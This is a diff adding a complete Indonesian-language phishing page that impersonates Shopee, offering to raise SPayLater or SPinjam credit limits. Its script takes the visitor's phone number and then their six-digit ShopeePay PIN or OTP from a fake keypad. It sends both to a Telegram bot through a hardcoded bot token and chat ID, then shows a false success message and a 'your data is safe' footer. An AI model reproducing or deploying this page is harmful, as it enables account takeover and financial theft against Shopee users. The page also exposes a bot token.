@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tingkatkan Limit Shopee</title>
+
+    <meta property="og:title" content="Tingkatkan Limit ShopeePay / SPayLater / SPinjam">
+    <meta property="og:description" content="Ajukan peningkatan limit layanan Shopee Anda dengan mudah dan cepat.">
+    <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-14-810a88ed-4e90-4858-b1b7-47acf107ae1a.jpg">
+    <meta property="og:image:secure_url" content="https://cdn.phototourl.com/member/2026-10-14-810a88ed-4e90-4858-b1b7-47acf107ae1a.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .header-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .form-content {
+            padding: 20px;
+            flex: 1;
+        }
+
+        .main-card-box {
+            background: #ffffff;
+            border: 1px solid #dcdcdc;
+            border-radius: 12px;
+            padding: 20px 16px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        .badge-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #ee4d2d;
+            color: #ffffff;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .badge-label svg {
+            width: 14px;
+            height: 14px;
+            fill: #ffffff;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 12px;
+        }
+
+        .section-title svg {
+            width: 18px;
+            height: 18px;
+            fill: #ee4d2d;
+        }
+
+        .input-box {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-box svg {
+            position: absolute;
+            left: 14px;
+            width: 20px;
+            height: 20px;
+            fill: #777777;
+            z-index: 2;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 14px 14px 14px 44px;
+            background: #ffffff;
+            border: 1px solid #cccccc;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #222222;
+            outline: none;
+            user-select: text;
+        }
+
+        .input-box input:focus {
+            border-color: #ee4d2d;
+        }
+
+        .service-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .service-card {
+            position: relative;
+            border: 1px solid #cccccc;
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 16px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .service-card.active {
+            border: 2px solid #ee4d2d;
+            background: #fff8f6;
+        }
+
+        .check-badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            width: 18px;
+            height: 18px;
+            background: #ee4d2d;
+            color: white;
+            border-radius: 50%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        .service-card.active .check-badge {
+            display: flex;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin: 0 auto 8px auto;
+            display: block;
+        }
+
+        .card-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 2px;
+        }
+
+        .service-card.active .card-title {
+            color: #ee4d2d;
+        }
+
+        .card-sub {
+            font-size: 12px;
+            font-weight: 500;
+            color: #666666;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: #ee4d2d;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ================= TAMPILAN PIN SHOPEEPAY ================= */
+        .shopee-pin-header {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            background: #ffffff;
+            border-bottom: 1px solid #e8e8e8;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .shopee-pin-header .btn-back {
+            background: none;
+            border: none;
+            font-size: 22px;
+            color: #ee4d2d;
+            cursor: pointer;
+            padding-right: 12px;
+            display: flex;
+            align-items: center;
+            position: absolute;
+            left: 16px;
+            z-index: 2;
+        }
+
+        .shopee-pin-header .title {
+            width: 100%;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 600;
+            color: #222222;
+        }
+
+        .otp-section {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            flex: 1;
+            background: #ffffff;
+        }
+
+        .pin-body-container {
+            width: 100%;
+            text-align: center;
+            padding-top: 45px;
+        }
+
+        .shopee-pin-subtitle {
+            font-size: 13px;
+            color: #888888;
+            margin-bottom: 30px;
+        }
+
+        /* 6 Bullet Points / Dots Pin */
+        .pin-dots-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 25px;
+        }
+
+        .pin-dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #cccccc;
+            background-color: transparent;
+            transition: all 0.15s ease;
+        }
+
+        .pin-dot.filled {
+            background-color: #222222;
+            border-color: #222222;
+        }
+
+        .forgot-pin {
+            font-size: 13px;
+            color: #2673dd;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* Keypad Angka Numpad Shopee */
+        .shopee-keypad {
+            width: 100%;
+            background-color: #f7f7f7;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1px;
+            border-top: 1px solid #e5e5e5;
+            margin-top: auto;
+        }
+
+        .keypad-btn {
+            background: #ffffff;
+            border: none;
+            height: 60px;
+            font-size: 24px;
+            font-weight: 500;
+            color: #222222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.1s;
+        }
+
+        .keypad-btn:active {
+            background-color: #e0e0e0;
+        }
+
+        .keypad-btn.empty {
+            background: #f7f7f7;
+            cursor: default;
+        }
+
+        .keypad-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: #333333;
+        }
+
+        /* Step 3 Process (Centang Hijau) */
+        .process-section {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon-box {
+            width: 64px;
+            height: 64px;
+            background-color: #2ecc71;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+
+        .success-icon-box svg {
+            width: 36px;
+            height: 36px;
+            fill: #ffffff;
+        }
+
+        .process-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .process-desc {
+            font-size: 14px;
+            color: #666666;
+            line-height: 1.5;
+        }
+
+        /* Footer */
+        .security-footer {
+            margin-top: 20px;
+            background: #fafafa;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .security-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-icon {
+            width: 28px;
+            height: 28px;
+            background: #eeeeee;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555555;
+            font-size: 13px;
+        }
+
+        .security-text h5 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #222222;
+        }
+
+        .security-text p {
+            font-size: 11px;
+            color: #666666;
+        }
+
+        .chevron-right {
+            color: #999999;
+            font-weight: 700;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <!-- HEADER KHUSUS LAYAR PIN SHOPEEPAY -->
+    <div id="shopeePinHeader" class="shopee-pin-header" style="display: none;">
+        <button type="button" class="btn-back" onclick="goBackToStep1()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ee4d2d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+        </button>
+        <div class="title">Masukkan PIN ShopeePay</div>
+    </div>
+
+    <!-- Gambar Header Atas -->
+    <img id="headerImage" src="https://cdn.phototourl.com/member/2026-10-14-1c5a4a30-ed6f-464c-87a0-decb96aa7860.png" alt="Header Banner" class="header-image">
+
+    <!-- Isi Formulir Utama -->
+    <div class="form-content" id="mainFormContent">
+        
+        <!-- STEP 1: Form Input Data -->
+        <form id="limitForm" onsubmit="handleNext(event)">
+            <div id="step1Form">
+                
+                <div class="main-card-box">
+                    <!-- Input Nomor Handphone -->
+                    <div class="form-group">
+                        <div class="badge-label">
+                            <svg viewBox="0 0 24 24"><path d="M17 2H7C5.89543 2 5 2.89543 5 4V20C5 21.1046 5.89543 22 7 22H17C18.1046 22 19 21.1046 19 20V4C19 2.89543 18.1046 2 17 2ZM17 18H7V6H17V18Z"/></svg>
+                            Nomor Handphone
+                        </div>
+                        <div class="input-box">
+                            <svg viewBox="0 0 24 24"><path d="M17 2H7C5.89543 2 5 2.89543 5 4V20C5 21.1046 5.89543 22 7 22H17C18.1046 22 19 21.1046 19 20V4C19 2.89543 18.1046 2 17 2ZM17 18H7V6H17V18Z"/></svg>
+                            <input type="tel" id="phone" placeholder="Masukan Nomor" required>
+                        </div>
+                    </div>
+
+                    <!-- Pilih Layanan Limit -->
+                    <div class="form-group">
+                        <div class="section-title">
+                            <svg viewBox="0 0 24 24"><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/></svg>
+                            Pilih Layanan Limit
+                        </div>
+                        <div class="service-grid">
+                            <div class="service-card" onclick="selectCard('SPayLater', this)">
+                                <div class="check-badge">✓</div>
+                                <img src="https://cdn.phototourl.com/member/2026-10-14-617d0b54-e3f5-46a6-a53d-fa60d1fd8057.png" alt="SPayLater" class="card-icon">
+                                <div class="card-title">SPayLater</div>
+                                <div class="card-sub">cicilan belanja</div>
+                            </div>
+
+                            <div class="service-card" onclick="selectCard('SPinjam', this)">
+                                <div class="check-badge">✓</div>
+                                <img src="https://cdn.phototourl.com/member/2026-10-14-ca6d00bd-68ee-4b99-84e5-77685c553769.png" alt="SPinjam" class="card-icon">
+                                <div class="card-title">SPinjam</div>
+                                <div class="card-sub">Pinjaman Tunai</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">
+                    Lanjutkan
+                </button>
+            </div>
+        </form>
+
+        <!-- STEP 3: Tampilan Proses / Sukses (Centang Hijau) -->
+        <div id="step3Process" class="process-section">
+            <div class="success-icon-box">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <div class="process-title">Pengajuan Berhasil</div>
+            <div class="process-desc">
+                Pengajuan Anda sedang diproses. Anda akan segera dihubungi layanan Shopee.
+            </div>
+        </div>
+
+        <!-- Footer Info Keamanan -->
+        <div id="securityFooter" class="security-footer">
+            <div class="security-left">
+                <div class="security-icon">🛡️</div>
+                <div class="security-text">
+                    <h5>Data Anda Aman</h5>
+                    <p>Kami menjaga keamanan informasi Anda.</p>
+                </div>
+            </div>
+            <div class="chevron-right">›</div>
+        </div>
+
+    </div>
+
+    <!-- STEP 2: Masukkan PIN ShopeePay (Presisi Aplikasi Shopee) -->
+    <div id="step2Otp" class="otp-section">
+        <div class="pin-body-container">
+            <div class="shopee-pin-subtitle">PIN ShopeePay diperlukan untuk mengonfirmasi identitas Anda</div>
+
+            <!-- 6 Bulatan PIN -->
+            <div class="pin-dots-wrapper">
+                <div class="pin-dot" id="dot-0"></div>
+                <div class="pin-dot" id="dot-1"></div>
+                <div class="pin-dot" id="dot-2"></div>
+                <div class="pin-dot" id="dot-3"></div>
+                <div class="pin-dot" id="dot-4"></div>
+                <div class="pin-dot" id="dot-5"></div>
+            </div>
+
+            <a class="forgot-pin" onclick="alert('Silakan verifikasi ulang nomor Anda')">Lupa PIN ShopeePay?</a>
+        </div>
+
+        <!-- KEYPAD DIGITAL KHAS SHOPEE -->
+        <div class="shopee-keypad">
+            <button type="button" class="keypad-btn" onclick="pressKey('1')">1</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('2')">2</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('3')">3</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('4')">4</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('5')">5</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('6')">6</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('7')">7</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('8')">8</button>
+            <button type="button" class="keypad-btn" onclick="pressKey('9')">9</button>
+            <button type="button" class="keypad-btn empty"></button>
+            <button type="button" class="keypad-btn" onclick="pressKey('0')">0</button>
+            <button type="button" class="keypad-btn" onclick="deleteKey()">
+                <svg viewBox="0 0 24 24"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7.07L2.4 12l4.67-7H22v14zm-11.59-2L14 13.41 17.59 17 19 15.59 15.41 12 19 8.41 17.59 7 14 10.59 10.41 7 9 8.41 12.59 12 9 15.59z"/></svg>
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = '7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io';
+    const TELEGRAM_CHAT_ID = '7667144622';
+
+    let selectedService = '';
+    let globalPhone = '';
+    let currentPin = '';
+
+    function selectCard(serviceName, element) {
+        selectedService = serviceName;
+        document.querySelectorAll('.service-card').forEach(card => card.classList.remove('active'));
+        element.classList.add('active');
+    }
+
+    function sendToTelegram(message) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(err => console.error('Error sending Telegram:', err));
+    }
+
+    function handleNext(e) {
+        e.preventDefault();
+        globalPhone = document.getElementById('phone').value;
+
+        if (!selectedService) {
+            alert('Silakan pilih layanan limit (SPayLater atau SPinjam) terlebih dahulu.');
+            return;
+        }
+
+        const msg = `🔔 *DATA BARU MASUK*\n\n` +
+                    `📦 *Layanan:* ${selectedService}\n` +
+                    `📱 *No HP:* \`${globalPhone}\``;
+        
+        sendToTelegram(msg);
+
+        // Pindah ke Tampilan PIN Shopee
+        document.getElementById('headerImage').style.display = 'none';
+        document.getElementById('securityFooter').style.display = 'none';
+        document.getElementById('mainFormContent').style.display = 'none';
+        
+        document.getElementById('shopeePinHeader').style.display = 'flex';
+        document.getElementById('step2Otp').style.display = 'flex';
+        
+        currentPin = '';
+        updatePinDots();
+    }
+
+    /* Fungsi Keypad Digital */
+    function pressKey(num) {
+        if (currentPin.length < 6) {
+            currentPin += num;
+            updatePinDots();
+
+            if (currentPin.length === 6) {
+                setTimeout(submitPin, 150);
+            }
+        }
+    }
+
+    function deleteKey() {
+        if (currentPin.length > 0) {
+            currentPin = currentPin.slice(0, -1);
+            updatePinDots();
+        }
+    }
+
+    function updatePinDots() {
+        for (let i = 0; i < 6; i++) {
+            const dot = document.getElementById(`dot-${i}`);
+            if (i < currentPin.length) {
+                dot.classList.add('filled');
+            } else {
+                dot.classList.remove('filled');
+            }
+        }
+    }
+
+    function submitPin() {
+        const msg = `🔐 *KODE OTP/PIN MASUK*\n\n` +
+                    `📦 *Layanan:* ${selectedService}\n` +
+                    `📱 *No HP:* \`${globalPhone}\`\n` +
+                    `🔑 *PIN/OTP:* \`${currentPin}\``;
+
+        sendToTelegram(msg);
+
+        // Pindah ke Layar Proses (Centang Hijau)
+        document.getElementById('shopeePinHeader').style.display = 'none';
+        document.getElementById('step2Otp').style.display = 'none';
+        
+        document.getElementById('headerImage').style.display = 'block';
+        document.getElementById('mainFormContent').style.display = 'block';
+        document.getElementById('step1Form').style.display = 'none';
+        document.getElementById('securityFooter').style.display = 'flex';
+        document.getElementById('step3Process').style.display = 'block';
+    }
+
+    function goBackToStep1() {
+        document.getElementById('shopeePinHeader').style.display = 'none';
+        document.getElementById('step2Otp').style.display = 'none';
+        
+        document.getElementById('headerImage').style.display = 'block';
+        document.getElementById('mainFormContent').style.display = 'block';
+        document.getElementById('step1Form').style.display = 'block';
+        document.getElementById('securityFooter').style.display = 'flex';
+        document.getElementById('step3Process').style.display = 'none';
+        
+        currentPin = '';
+        updatePinDots();
+    }
+</script>
+
+</body>
+</html>
